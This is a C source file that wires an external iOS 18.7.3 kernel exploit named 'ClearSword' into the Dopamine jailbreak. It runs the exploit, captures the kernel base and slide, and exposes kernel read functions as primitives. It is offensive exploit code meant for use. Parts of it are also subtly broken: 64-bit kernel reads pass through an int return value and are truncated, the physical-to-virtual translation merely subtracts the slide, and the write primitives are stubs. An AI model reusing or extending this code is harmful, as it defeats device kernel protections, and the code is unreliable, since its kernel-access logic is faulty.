#include "primitives_ClearSword.h"
#include "primitives_external.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ClearSword internal functions (from poc.c)
extern int clearsword_run(void);
extern uint64_t g_kernel_base;
extern uint64_t g_kernel_slide;
extern int early_kread64(uint64_t kaddr);

// Global primitives struct
extern struct kernel_primitives gPrimitives;

// Static variables for ClearSword state
static uint64_t cs_kernel_base = 0;
static uint64_t cs_kernel_slide = 0;
static int cs_initialized = 0;

// iOS version detection
static uint32_t ios_major_version = 0;
static uint32_t ios_minor_version = 0;

static void detect_ios_version(void) {
    char version[32] = {};
    size_t version_len = sizeof(version);
    sysctlbyname("kern.osproductversion", version, &version_len, NULL, 0);
    sscanf(version, "%d.%d", &ios_major_version, &ios_minor_version);
    printf("[ClearSword] iOS version: %d.%d\n", ios_major_version, ios_minor_version);
}

int clearsword_primitives_init(void) {
    printf("[ClearSword] Initializing for iOS 18.7.3...\n");
    
    detect_ios_version();
    
    // Verify we're on iOS 18.7.3
    if (ios_major_version != 18 || ios_minor_version != 7) {
        printf("[ClearSword] Warning: Not iOS 18.7.3 (detected %d.%d)\n", 
               ios_major_version, ios_minor_version);
    }
    
    // Run the ClearSword exploit
    int ret = clearsword_run();
    if (ret != 0) {
        printf("[ClearSword] Exploit failed with error: %d\n", ret);
        return ret;
    }
    
    // Get kernel info
    cs_kernel_base = g_kernel_base;
    cs_kernel_slide = g_kernel_slide;
    
    printf("[ClearSword] Kernel base: 0x%llx\n", cs_kernel_base);
    printf("[ClearSword] Kernel slide: 0x%llx\n", cs_kernel_slide);
    
    cs_initialized = 1;
    
    // Set up gPrimitives for Dopamine
    gPrimitives.kreadbuf = clearsword_kreadbuf;
    gPrimitives.kwritebuf = clearsword_kwritebuf;
    gPrimitives.physreadbuf = clearsword_physreadbuf;
    gPrimitives.physwritebuf = clearsword_physwritebuf;
    
    printf("[ClearSword] Primitives initialized successfully!\n");
    return 0;
}

uint64_t clearsword_get_kernel_base(void) {
    return cs_kernel_base;
}

uint64_t clearsword_get_kernel_slide(void) {
    return cs_kernel_slide;
}

int clearsword_kreadbuf(uint64_t kaddr, void* output, size_t size) {
    if (!cs_initialized) return -1;
    
    uint64_t *out = (uint64_t *)output;
    size_t count = size / sizeof(uint64_t);
    
    for (size_t i = 0; i < count; i++) {
        uint64_t val = (uint64_t)early_kread64(kaddr + (i * sizeof(uint64_t)));
        out[i] = val;
    }
    
    // Handle remaining bytes
    size_t remaining = size % sizeof(uint64_t);
    if (remaining > 0) {
        uint64_t val = (uint64_t)early_kread64(kaddr + (count * sizeof(uint64_t)));
        memcpy((char*)output + (count * sizeof(uint64_t)), &val, remaining);
    }
    
    return 0;
}

int clearsword_kwritebuf(uint64_t kaddr, const void* input, size_t size) {
    if (!cs_initialized) return -1;
    
    // ClearSword kwrite is not implemented in the current version
    // This is a placeholder for future implementation
    printf("[ClearSword] kwritebuf not implemented yet\n");
    return -1;
}

int clearsword_physreadbuf(uint64_t physaddr, void* output, size_t size) {
    if (!cs_initialized) return -1;
    
    // Convert physical to virtual using kernel base
    uint64_t virtualaddr = physaddr - cs_kernel_slide;
    return clearsword_kreadbuf(virtualaddr, output, size);
}

int clearsword_physwritebuf(uint64_t physaddr, const void* input, size_t size) {
    if (!cs_initialized) return -1;
    
    printf("[ClearSword] physwritebuf not implemented yet\n");
    return -1;
}
